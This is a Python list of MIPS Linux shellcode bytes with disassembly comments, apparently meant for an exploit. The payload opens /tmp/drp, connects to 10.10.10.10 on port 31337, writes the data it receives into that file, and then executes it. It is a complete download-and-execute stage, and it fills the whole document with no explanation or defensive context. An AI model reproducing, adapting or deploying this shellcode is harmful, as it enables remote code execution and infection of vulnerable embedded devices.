shellcode=[
	"\x3c\x0f\x2f\x74",    # lui	t7,0x2f74
	"\x35\xef\x6d\x70",    # ori	t7,t7,0x6d70
	"\xaf\xaf\xff\xf4",    # sw	t7,-12(sp)
	"\x3c\x0e\x2f\x64",    # lui	t6,0x2f64
	"\x35\xce\x72\x70",    # ori	t6,t6,0x7270
	"\xaf\xae\xff\xf8",    # sw	t6,-8(sp)
	"\xaf\xa0\xff\xfc",    # sw	zero,-4(sp)
	"\x27\xa4\xff\xf4",    # addiu	a0,sp,-12
	"\x24\x05\x01\x11",    # li	a1,273
	"\x24\x06\x01\xff",    # li	a2,511
	"\x24\x02\x0f\xa5",    # li	v0,4005
	"\x01\x01\x01\x0c",    # syscall	0x40404
	"\xaf\xa2\xff\xd4",    # sw	v0,-44(sp)
	"\x24\x0f\xff\xfd",    # li	t7,-3
	"\x01\xe0\x28\x27",    # nor	a1,t7,zero
	"\xaf\xa5\xff\xe0",    # sw	a1,-32(sp)
	"\x8f\xa4\xff\xe0",    # lw	a0,-32(sp)
	"\x28\x06\xff\xff",    # slti	a2,zero,-1
	"\x24\x02\x10\x57",    # li	v0,4183
	"\x01\x01\x01\x0c",    # syscall	0x40404
	"\xaf\xa2\xff\xff",    # sw	v0,-1(sp)
	"\x8f\xa4\xff\xff",    # lw	a0,-1(sp)
	"\x3c\x0e\x7a\x69",    # lui	t6,0x7a69
	"\x35\xce\x7a\x69",    # ori	t6,t6,0x7a69
	"\xaf\xae\xff\xe4",    # sw	t6,-28(sp)
	"\x3c\x0d\x0a\x0a",    # lui	t5,0xa0a
	"\x35\xad\x0a\x0a",    # ori	t5,t5,0xa0a
	"\xaf\xad\xff\xe6",    # sw	t5,-26(sp)
	"\x27\xa5\xff\xe2",    # addiu	a1,sp,-30
	"\x24\x0c\xff\xef",    # li	t4,-17
	"\x01\x80\x30\x27",    # nor	a2,t4,zero
	"\x24\x02\x10\x4a",    # li	v0,4170
	"\x01\x01\x01\x0c",    # syscall	0x40404
	"\x28\x06\xff\xff",    # slti	a2,zero,-1
	"\x8f\xa4\xff\xd4",    # lw	a0,-44(sp)
	"\x27\xa5\xff\xd0",    # addiu	a1,sp,-48
	"\x24\x02\x0f\xa4",    # li	v0,4004
	"\x01\x01\x01\x0c",    # syscall	0x40404
	"\x8f\xa4\xff\xff",    # lw	a0,-1(sp)
	"\x27\xa5\xff\xd0",    # addiu	a1,sp,-48
	"\x28\x06\x0f\xff",    # slti	a2,zero,4095
	"\x24\x02\x0f\xa3",    # li	v0,4003
	"\x01\x01\x01\x0c",    # syscall	0x40404
	"\x1c\x40\xff\xf6",    # bgtz	v0,88 <write_file>
	"\x24\x02\x0f\xa6",    # li	v0,4006
	"\x01\x01\x01\x0c",    # syscall	0x40404
	"\x8f\xa4\xff\xd4",    # lw	a0,-44(sp)
	"\x24\x02\x0f\xa6",    # li	v0,4006
	"\x01\x01\x01\x0c",    # syscall	0x40404
	"\x27\xa4\xff\xf4",    # addiu	a0,sp,-12
	"\xaf\xa4\xff\xd0",    # sw	a0,-48(sp)
	"\xaf\xa2\xff\xd4",    # sw	v0,-44(sp)
	"\x28\x06\xff\xff",    # slti	a2,zero,-1
	"\x24\x02\x0f\xab",    # li	v0,4011
	"\x01\x01\x01\x0c"]    # syscall	0x40404
